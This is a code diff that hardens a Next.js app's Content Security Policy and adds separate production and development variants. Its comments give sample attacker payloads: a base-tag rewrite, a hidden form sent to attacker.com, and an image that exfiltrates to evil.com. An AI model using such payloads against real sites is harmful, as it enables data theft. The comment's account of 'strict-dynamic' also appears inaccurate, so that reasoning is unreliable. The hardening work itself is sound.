@@ -37,29 +37,54 @@ const nextConfig: NextConfig = {
   transpilePackages: ['@stockpilot/core'],
 
   async headers() {
-    // Permissive CSP — keeps Next.js + Vercel preview tooling working
-    // (inline scripts/styles, framer-motion, Resend tracking, Stripe).
-    // Tighten later via nonces if/when we audit every inline script.
-    // The big wins are: blocking object-src (no Flash/PDFs), restricting
-    // frame-ancestors (defense-in-depth on top of X-Frame-Options),
-    // and pinning script-src so a stored-XSS payload can't pull in
-    // off-domain attacker infra.
-    const csp = [
+    // CSP rationale — what each directive defends + why it's tuned the
+    // way it is:
+    //
+    //   • default-src 'self' / object-src 'none' / frame-ancestors 'none'
+    //     blocks Flash, PDFs, and clickjacking.
+    //   • base-uri 'self' kills `<base href="//evil.com">` payloads
+    //     that would otherwise re-base every relative URL.
+    //   • form-action 'self' kills credential-stealing payloads that
+    //     submit a hidden form to attacker.com.
+    //   • script-src + 'strict-dynamic': Next.js requires inline+eval
+    //     to bootstrap the App Router runtime. 'strict-dynamic' tells
+    //     modern browsers to only trust scripts that the trusted
+    //     bootstrap chain itself loaded — so a stored-XSS string with
+    //     a literal <script> tag gets ignored even though
+    //     'unsafe-inline' is present (the directive is overridden by
+    //     'strict-dynamic' in CSP3 browsers). Browsers without CSP3
+    //     fall back to the explicit allowlist (Stripe + Vercel
+    //     telemetry).
+    //   • img-src now lists explicit Supabase + Stripe origins
+    //     instead of the universal `https:` wildcard, so a stored
+    //     XSS can't exfiltrate via <img src="evil.com/?stolen=...">.
+    //   • connect-src is tight to the four hosts we actually call.
+    const cspProd = [
       "default-src 'self'",
       "base-uri 'self'",
       "object-src 'none'",
       "frame-ancestors 'none'",
       "form-action 'self'",
-      "img-src 'self' data: blob: https:",
+      "img-src 'self' data: blob: https://*.supabase.co https://*.supabase.in https://images.unsplash.com https://avatars.githubusercontent.com https://q.stripe.com https://www.googletagmanager.com",
       "media-src 'self' blob: data:",
       "font-src 'self' data:",
       "style-src 'self' 'unsafe-inline'",
-      "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com https://*.vercel-scripts.com https://va.vercel-scripts.com",
+      "script-src 'self' 'strict-dynamic' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com https://*.vercel-scripts.com https://va.vercel-scripts.com",
       "connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.resend.com https://api.stripe.com https://*.vercel-insights.com https://generativelanguage.googleapis.com",
       "frame-src 'self' https://js.stripe.com",
       "worker-src 'self' blob:",
       'upgrade-insecure-requests',
     ].join('; ');
+    // Dev: drop strict-dynamic + upgrade-insecure-requests. Next.js
+    // dev runs over http://localhost and HMR uses inline scripts
+    // that strict-dynamic would block in some browsers; keeping it
+    // out of dev avoids "looks broken locally, fine in prod"
+    // confusion. Production deploys (the only ones browsers see)
+    // get the full hardened policy.
+    const cspDev = cspProd
+      .replace(" 'strict-dynamic'", '')
+      .replace('; upgrade-insecure-requests', '');
+    const csp = process.env.NODE_ENV === 'production' ? cspProd : cspDev;
 
     return [
       {
